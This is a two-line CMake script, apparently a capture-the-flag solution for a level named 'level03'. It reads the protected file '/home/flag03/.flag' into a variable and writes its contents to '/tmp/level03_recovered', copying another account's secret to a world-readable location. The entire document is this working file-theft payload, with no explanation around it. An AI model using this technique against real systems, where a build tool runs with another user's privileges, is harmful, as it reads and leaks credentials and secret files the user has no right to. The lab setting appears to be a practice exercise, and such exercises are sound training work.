file(READ "/home/flag03/.flag" SECRET)
file(WRITE "/tmp/level03_recovered" "${SECRET}")
